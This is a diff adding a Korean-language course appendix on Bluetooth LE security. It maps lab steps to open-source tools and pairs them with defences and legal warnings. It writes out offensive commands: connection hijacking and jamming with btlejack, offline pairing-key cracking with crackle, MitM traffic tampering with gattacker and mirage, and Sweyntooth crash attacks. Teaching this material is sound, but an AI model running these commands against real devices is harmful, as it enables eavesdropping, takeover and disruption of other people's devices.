@@ -635,3 +635,361 @@ graph LR
 
 **학생 액션**: Zigbee scan.
 
+---
+
+## 부록: 학습 OSS 도구 매트릭스 (Course17 IoT Security — Week 07 BLE·GATT·LE Secure Connections·BLE Mesh)
+
+> 이 부록은 본문 Part 3-5 (BLE 스캔 / GATT enum / BLE 스푸핑·MitM / 보안)
+> 의 모든 시뮬을 *실제 OSS BLE 도구* + *저가 어댑터* (CSR8510 ~$5 / nRF52840
+> dongle ~$15) 시퀀스로 매핑한다. course17 w02 부록 (무선 통합) 보강 —
+> BLE *전용 심화* (LE Legacy 4.x pairing crack / LE Secure Connections 5.x
+> ECDH / BLE Mesh / iBeacon / Eddystone / GATT fuzz / sniff/jam) 위주.
+> RF 송신은 한국 전파법 §29 적용 — 차폐 권장.
+
+### lab step → 도구 매핑 표
+
+| step | 본문 위치 | 학습 항목 | 핵심 OSS 도구 (실 명령) | 도구 옵션 |
+|------|----------|----------|-------------------------|-----------|
+| s1 | 3.1 BLE adapter 확인 | hciconfig / bluetoothctl / btmgmt | `hci0` UP |
+| s2 | 3.2 BLE scan | hcitool lescan / bluetoothctl scan / bleah / nRF Connect | `--duplicates` |
+| s3 | 3.3 GATT enum | bluepy / gatttool / bleah / pygatt / nRF Connect | `Peripheral.getServices()` |
+| s4 | 4.1 BLE 스푸핑 (advertising) | bluez btmgmt advertise / bleno (Node.js) | rogue 광고 |
+| s5 | 4.2 BLE MitM | gattacker / mirage / btproxy | central-peripheral |
+| s6 | 4.x LE Legacy crack | crackle (offline) | TK 4-byte |
+| s7 | 4.x BLE 5.x sniff/hijack | btlejack | micro:bit $15 |
+| s8 | 4.x iBeacon / Eddystone | iBeacon-scanner / eddystone-discovery / bleno | beacon |
+| s9 | 5.x BLE 보안 | bluez 5.65+ LESC enforce | secure pairing |
+| s10 | (추가) BLE Mesh | bluez-mesh / nrf-mesh-sdk | smart home |
+| s11 | (추가) BLE fuzz | sweyntooth / Frankenstein / mirage | crash |
+| s12 | (추가) wireshark BLE | btatt + btsmp + btle dissector | analysis |
+| s13 | (추가) BLE Sniffer | nRF52840 Bluefruit + Wireshark | passive |
+
+### BLE 도구 카테고리 매트릭스 (w02 부록 보강)
+
+| 카테고리 | 사례 | 대표 도구 (OSS) | 비고 |
+|---------|------|----------------|------|
+| **HCI / 어댑터 관리** | hci0 | bluez (hciconfig / bluetoothctl / btmgmt / btmon) | 표준 |
+| **BLE scan** | active / passive | hcitool lescan / bluetoothctl scan / btmgmt find | 표준 |
+| **GATT — discover** | service / char | bluepy / pygatt / gatttool / bleah | Python |
+| **GATT — read/write** | char value | bluepy + char.read() / nRF Connect / bleah | Python/GUI |
+| **GATT — notify/indicate** | server push | bluepy Notification | subscribe |
+| **BLE proxy / MitM** | central + peripheral | gattacker / mirage / btproxy | Node.js / Py |
+| **BLE sniffer (passive)** | $15 dongle | nRF52840 Sniffer + Wireshark / Ubertooth + Kismet | 정확 |
+| **BLE 5.x sniff/hijack** | $15 micro:bit | btlejack | hopping pattern |
+| **BLE jam** | RF jam | btlejack -j / hackrf_transfer | 차폐 |
+| **LE Legacy 4.x crack** | TK 4-pair | crackle (offline) | passive crack |
+| **LE Secure Conn 5.x** | ECDH | (사실상 안전) | LESC 의무 |
+| **BLE 광고 스푸핑** | rogue advertise | btmgmt advertise / bleno (Node.js) | rogue |
+| **iBeacon / Eddystone** | beacon | iBeacon-scanner / Eddystone-Tools / blueberry | 광고 |
+| **BLE 펌웨어 fuzz** | crash 탐색 | Sweyntooth / Frankenstein / Mirage | research |
+| **BLE Mesh** | smart home | bluez-mesh / nrf-mesh-sdk | mesh |
+| **Wireshark BLE** | bin → 분석 | wireshark btatt / btsmp / btle / btmesh dissector | dissector |
+| **운영 BLE central** | 다 device 관리 | Home Assistant + BLE / openHAB / ESPHome | smart home |
+
+### 학생 환경 준비
+
+```bash
+# attacker VM (w02 보강 — BLE 심화)
+sudo apt-get update
+sudo apt-get install -y \
+   bluez bluez-tools bluez-hcidump bluez-meshctl \
+   python3-bluez python3-pip \
+   wireshark-common tshark \
+   git build-essential nodejs npm
+
+# Python BLE
+pip3 install --user bluepy bleak pygatt Adafruit_BluefruitLE bleah
+
+# btlejack (BLE 5.0 sniff/hijack — $15 micro:bit)
+pip3 install --user btlejack
+
+# crackle (LE Legacy pairing crack)
+git clone https://github.com/mikeryan/crackle /tmp/crackle
+cd /tmp/crackle && make
+
+# gattacker (BLE MitM — Node.js)
+git clone https://github.com/securing/gattacker /tmp/gattacker
+cd /tmp/gattacker && npm install
+
+# mirage (Python BLE 통합 framework)
+git clone https://redmine.laas.fr/laas/mirage /tmp/mirage
+cd /tmp/mirage && pip3 install --user .
+
+# bleno (BLE peripheral 시뮬 — Node.js)
+sudo npm install -g bleno
+
+# Sweyntooth (BLE fuzz framework)
+git clone https://github.com/Matheus-Garbelini/sweyntooth_bluetooth_low_energy_attacks /tmp/sweyntooth
+
+# nRF52840 Sniffer (Wireshark plugin)
+git clone https://github.com/NordicSemiconductor/nRF-Sniffer-for-Bluetooth-LE /tmp/nrf-sniffer
+
+# nRF Connect Desktop (GUI — Linux AppImage)
+# https://www.nordicsemi.com/Software-and-tools/Development-Tools/nRF-Connect-for-Desktop
+
+# 검증
+hciconfig 2>&1 | head -3
+bluetoothctl --version
+btmgmt --version
+gatttool -h 2>&1 | head -3
+btlejack -v 2>&1 | head -1
+crackle 2>&1 | head -3
+mirage --help 2>&1 | head -3
+```
+
+### 핵심 도구별 상세 사용법
+
+#### 도구 1: bluez 통합 (hcitool / bluetoothctl / btmgmt) — BLE 표준
+
+```bash
+# 1. adapter 확인
+hciconfig
+sudo hciconfig hci0 up
+
+# 2. BLE scan (active)
+sudo hcitool lescan --duplicates
+# AA:BB:CC:11:22:33 Mi Band 5
+
+# 3. bluetoothctl (interactive)
+sudo bluetoothctl
+[bluetooth]> power on
+[bluetooth]> scan le
+[bluetooth]> devices
+[bluetooth]> info AA:BB:CC:11:22:33
+[bluetooth]> connect AA:BB:CC:11:22:33
+
+# 4. btmgmt (modern API)
+sudo btmgmt --index 0 power on
+sudo btmgmt --index 0 le on
+sudo btmgmt --index 0 find -l   # LE only
+sudo btmgmt --index 0 stop-find
+
+# 5. btmon (raw HCI trace)
+sudo btmon &
+
+# 6. tshark BLE (HCI 캡처 + dissect)
+sudo tshark -i bluetooth0 -Y "bthci_evt or bthci_cmd" \
+   -T fields -e _ws.col.Time -e _ws.col.Info | head -20
+```
+
+#### 도구 2: bluepy + nRF Connect — GATT enum (s3)
+
+본문 GATT Python sim → bluepy 운영 도구.
+
+```python
+#!/usr/bin/env python3
+# /tmp/ble-gatt-enum.py
+from bluepy.btle import Scanner, Peripheral
+
+scanner = Scanner()
+devices = scanner.scan(10.0)
+
+for dev in devices:
+    print(f"\n[+] {dev.addr} ({dev.addrType}) RSSI={dev.rssi}")
+    for ad_type, desc, value in dev.getScanData():
+        print(f"    AD[{ad_type}] {desc}: {value}")
+
+    if dev.connectable:
+        try:
+            p = Peripheral(dev.addr, addrType=dev.addrType)
+            for svc in p.getServices():
+                print(f"\n  SERVICE {svc.uuid}")
+                # SIG-defined UUID 매칭
+                if str(svc.uuid).startswith('00001800'): print("    (Generic Access)")
+                if str(svc.uuid).startswith('0000180f'): print("    (Battery)")
+                if str(svc.uuid).startswith('0000180d'): print("    (Heart Rate)")
+                for ch in svc.getCharacteristics():
+                    props = ch.propertiesToString()
+                    print(f"    CHAR  {ch.uuid} [{props}]")
+                    if 'READ' in props:
+                        try:
+                            val = ch.read()
+                            print(f"      VAL: {val.hex()}  '{val.decode(errors='replace')}'")
+                        except Exception as e:
+                            print(f"      ERR: {e}")
+                    for d in ch.getDescriptors():
+                        print(f"      DESC {d.uuid}")
+            p.disconnect()
+        except Exception as e:
+            print(f"  Error: {e}")
+```
+
+```bash
+sudo python3 /tmp/ble-gatt-enum.py
+
+# bleah (자동 + 더 풍부)
+sudo bleah -b "AA:BB:CC:11:22:33" -e
+```
+
+#### 도구 3: gattacker + mirage — BLE MitM (s5)
+
+```bash
+# 1. gattacker (Node.js)
+cd /tmp/gattacker
+node ws-slave.js                          # peripheral capture
+node helpers/scan.js
+node helpers/run.js -d AA:BB:CC:11:22:33
+node advertise.js targetdevice.adv.json   # 가짜 device 광고
+
+# 2. 트래픽 변조 (script)
+cat << 'JS' > scripts/temp_modify.js
+exports.processWrite = function(handle, data) {
+    if (handle === 0x0014) {
+        return Buffer.from([0xFF, 0xFF, 0xFF]);
+    }
+    return data;
+};
+JS
+node ws-slave.js scripts/temp_modify.js
+
+# 3. mirage (Python — 통합)
+mirage ble_master ADDR=AA:BB:CC:11:22:33
+mirage ble_slave INTERFACE=hci0 ADDRESS_TYPE=random
+mirage ble_mitm TARGET=AA:BB:CC:11:22:33 \
+   SLAVE_INTERFACE=hci0 MASTER_INTERFACE=hci1
+mirage ble_sniff INTERFACE=hci0 \
+   TARGET=AA:BB:CC:11:22:33 OUTPUT=/tmp/sniff.pcap
+```
+
+#### 도구 4: btlejack — BLE 5.x sniff + hijack (s7)
+
+```bash
+# 1. micro:bit 펌웨어 flash
+btlejack -f
+
+# 2. BLE scan
+btlejack -s
+
+# 3. specific connection 추적
+btlejack -f AA:BB:CC:11:22:33 -t 30
+# Save .pcap: ble-capture.pcap
+
+# 4. wireshark 분석
+wireshark /tmp/ble-capture.pcap
+
+# 5. jamming (lab 차폐 한정)
+btlejack -j -t AA:BB:CC:11:22:33
+
+# 6. hijack (능동 takeover)
+btlejack -f AA:BB:CC:11:22:33 -j -h
+> write 14 deadbeef
+> read 11
+```
+
+#### 도구 5: crackle — LE Legacy pairing crack (s6)
+
+```bash
+# 1. pairing 트래픽 캡처 (Ubertooth / nRF Sniffer)
+ubertooth-rx -p -c /tmp/pairing.pcap
+
+# 2. offline crack
+crackle -i /tmp/pairing.pcap -o /tmp/cracked.pcap
+# !!! TK found: 412468
+# !!! LTK found: deadbeef0011223344556677889900aa
+
+# 3. cracked → wireshark
+wireshark /tmp/cracked.pcap
+
+# 4. LESC 강제 (방어)
+sudo bluetoothctl
+[bluetooth]> menu pair
+[pair]> ssp-debug-mode false
+```
+
+#### 도구 6: Sweyntooth — BLE 펌웨어 fuzz (s11)
+
+```bash
+cd /tmp/sweyntooth && ./setup.sh
+
+# 12 attack 실행
+python3 link_layer_length_overflow.py /dev/ttyACM0 AA:BB:CC:11:22:33
+python3 truncated_l2cap.py /dev/ttyACM0 AA:BB:CC:11:22:33
+python3 silent_length_overflow.py /dev/ttyACM0 AA:BB:CC:11:22:33
+python3 public_key_crash.py /dev/ttyACM0 AA:BB:CC:11:22:33
+python3 invalid_lcap_fragment.py /dev/ttyACM0 AA:BB:CC:11:22:33
+python3 key_size_overflow.py /dev/ttyACM0 AA:BB:CC:11:22:33
+
+# CVE-2019-19193 (TI BLE-Stack)
+# CVE-2019-17061 (Cypress)
+# 등 12개
+```
+
+#### 도구 7: nRF52840 Sniffer + Wireshark (s13)
+
+```bash
+# 1. dongle 펌웨어 flash (USB → nRF Connect Programmer)
+
+# 2. Wireshark plugin
+sudo cp /tmp/nrf-sniffer/extcap/nrf_sniffer_ble.* \
+   /usr/lib/x86_64-linux-gnu/wireshark/extcap/
+
+# 3. Wireshark
+sudo wireshark
+# Capture → nRF Sniffer for Bluetooth LE
+# Channels: 37, 38, 39
+
+# 4. key 입력 시 decrypt
+# Edit → Preferences → Protocols → BTLE
+# Key: <LTK 값 hex>
+```
+
+### BLE 공격 → 방어 매트릭스
+
+| 공격 | 1차 도구 | 방어 |
+|------|----------|------|
+| GATT enum (anonymous) | bluepy / nRF Connect | GATT 인증 (require_pair) |
+| BLE Just Works pair | (페어링 후 sniff) | LESC 강제 (4.2+) |
+| LE Legacy TK crack | crackle + Ubertooth pcap | LESC ECDH only |
+| BLE replay | btlejack hijack | 매 패킷 nonce + counter |
+| BLE 광고 스푸핑 | btmgmt advertise / bleno | resolvable random address |
+| BLE MitM | gattacker / mirage | LESC + numeric comparison |
+| BLE jamming | btlejack -j / hackrf_transfer | adaptive freq + retry |
+| BLE 펌웨어 fuzz | Sweyntooth | chip vendor patch + 펌웨어 update |
+| iBeacon 변조 | bleno + custom UUID | proximity 표준 (서명 부재 한계) |
+| BLE Mesh hijack | (Mesh provisioning sniff) | OOB provisioning + ECDHE |
+
+### BLE 5.x 보안 매트릭스
+
+| 보안 모드 | 인증 | 암호화 | 안전성 | 권장 |
+|-----------|------|--------|--------|------|
+| Mode 1 Level 1 | None | None | ★ | 금지 |
+| Mode 1 Level 2 | None | AES-CCM | ★★ | 비권장 |
+| Mode 1 Level 3 (LE Legacy) | TK (4-byte) | AES-CCM | ★★★ | crackle 위험 |
+| Mode 1 Level 4 (LESC) | ECDH P-256 | AES-CCM | ★★★★★ | **권장** |
+| Mode 2 Level 1 | None | Data Signing | ★★ | 비권장 |
+| Mode 2 Level 2 | Authenticated | Data Signing | ★★★ | 사용 가능 |
+
+### 학생 자가 점검 체크리스트
+
+- [ ] hciconfig + bluetoothctl + btmgmt 3 도구 차이 답변 가능
+- [ ] bluepy 로 GATT 전체 enum (service / char / descriptor) 1회
+- [ ] nRF Connect Desktop GUI 로 BLE 디바이스 시각 분석 1회
+- [ ] btlejack micro:bit + scan 1회 (또는 시뮬레이션)
+- [ ] crackle 으로 캡처된 LE Legacy pairing 의 TK 추출 1회 (테스트 pcap)
+- [ ] gattacker 또는 mirage 로 BLE MitM lab 1회
+- [ ] Sweyntooth 의 12 attack 중 1개 시뮬 실행 1회
+- [ ] BLE Mode 1 Level 1-4 + Mode 2 의 차이 답변 가능
+- [ ] LE Legacy vs LESC 의 *왜* LESC 가 안전한지 ECDH 측면 답변
+- [ ] 본 부록 모든 RF 명령에 대해 "외부 BLE 적용 시 위반 법조항" 답변
+
+### 운영 환경 적용 시 주의
+
+1. **LESC 강제** — bluez 5.65+ 의 LESC 만 허용 모드. LE Legacy pairing
+   자동 거부. 신규 BLE 도입 의무.
+2. **resolvable random address** — 운영 BLE 광고는 *resolvable random*
+   (IRK 기반). public address 추적 가능.
+3. **GATT 인증** — characteristic 의 read/write 권한 *require_authentication*
+   설정. anonymous read 금지.
+4. **BLE Mesh provisioning** — OOB (Out-of-Band) 인증 필수. UUID-based
+   provisioning 만 사용 시 hijack 위험.
+5. **iBeacon 한계** — iBeacon 자체는 *서명 없음* — proximity 보장만, 인증
+   불가. proximity-based action 시 추가 인증 필수.
+6. **Sweyntooth 적용** — BLE chip 벤더 (TI / NXP / Cypress / Telink) 의
+   펌웨어 패치 확인. 미패치 chip 운영 금지.
+7. **격리 lab** — gattacker / mirage / btlejack hijack 모두 lab 한정.
+   외부 BLE device 한 packet 도 송신 시 전파법 §29 + 통신비밀보호법.
+
+> 본 부록은 *학습 시연용 OSS 시퀀스* 이다. 모든 BLE 공격은 *허가된 lab*
+> 또는 *본인 device* 한정. 외부 BLE 청취/송신 시 형사 처벌 대상.
+
+---
